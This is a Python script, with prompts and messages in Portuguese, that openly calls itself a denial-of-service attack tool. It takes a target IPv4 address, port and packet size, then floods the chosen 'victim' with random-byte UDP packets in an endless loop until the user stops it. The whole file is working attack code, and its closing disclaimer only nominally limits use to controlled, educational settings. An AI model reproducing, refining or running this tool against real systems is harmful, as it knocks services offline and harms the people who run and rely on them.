import socket, os, time, sys, ipaddress

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

os.system('cls' if os.name == 'nt' else 'clear')
print("########################################################################################################################")
print()
print("                                       Ferramenta de ataque DoS (Denial of Service)")
print("                                          Github: https://github.com/Bartzin55")
print("                                          Github: https://github.com/bella4424")
print()
print("########################################################################################################################")

#entrada do IP
ip = input("\nIP de destino (Apenas IPv4): ")

#validação do IP
try:
    ipaddress.IPv4Address(ip)
except ipaddress.AddressValueError:
    print("IP inválido")
    sys.exit()

#entrada da porta
strport = input("Porta de destino: ")

#validação da porta
try:
    port = int(strport)
except(TypeError, ValueError):
    print("Porta inválida.")
    sys.exit()
if port < 0 or port > 65535:
    print("Porta inválida.")
    sys.exit()

#entrada do tamanho do pacote
strpacketsize = input("tamanho de cada pacote enviado em bytes (recomendado: 1472 | máximo: 9000): ")

#validação do tamanho do pacote
try:
    packetsize = int(strpacketsize)
except(ValueError, TypeError):
    print("Tamanho inválido.")
    sys.exit()
if packetsize < 0 or packetsize > 9000:
    print("Tamanho inválido.")
    sys.exit()

#gera um pacote de bytes aleatórios, do tamanho especificado pelo user
packet = os.urandom(packetsize)
time.sleep(1)
destination = (ip,port)

print("\n.")
time.sleep(1)
print(".")
time.sleep(1)
print(".")
time.sleep(1)

print("\n-----------------------------------------------------CONSIDERAÇÕES-----------------------------------------------------\n")

print("1 - O pacote enviado é UDP e não haverá confirmação de recebimento,\n    por isso tenha certeza de que o IP e porta setados estão corretos.\n\n2 - O tamanho de pacote de dados recomendado é de 1472 bytes, pois é um valor que a maior parte das redes aceitam,\n    sem que ele seja fragmentado.\n    Caso você saiba o MTU da rede, configure valores ao seu gosto.")
print("\n--------------------------------------------------------REVISÃO--------------------------------------------------------\n")
print(f"IP de destino: {ip}\nPorta: {port}\nTamanho do pacote de dados: {packetsize}\n")
print("-----------------------------------------------------------------------------------------------------------------------")
print("\n\n                                                   !! AVISO !!")
print("                                          USE ESTE PROGRAMA POR SUA CONTA E RICSO.")
print("                 NÃO INCENTIVAMOS O USO FORA DE AMBIENTES CONTROLADOS E COM PROPÓSITOS NÃO EDUCACIONAIS!\n\n")
print("-----------------------------------------------------------------------------------------------------------------------")
print("\nApós a confirmação, o envio de pacotes se iniciará. Você pode pará-lo a qualquer momento com CONTROL+C.")
confirmation = input("Iniciar envio de pacotes (y): ")

if confirmation == "y" or confirmation == "Y":
    os.system('cls' if os.name == 'nt' else 'clear')
    print(f"IP vítima: {ip}, porta: {port}")
    print("Iniciando, pare a qualquer momento com CONTROL+C...")
    time.sleep(5)

    packetcount = 1
    while True:
        print(f"Enviando {packetcount} pacotes de {packetsize} bytes para {ip}:{port}")
        packetcount = packetcount+1
        sock.sendto(packet, destination)

else:
    print("\nOPERAÇÃO CANCELADA")
    sys.exit()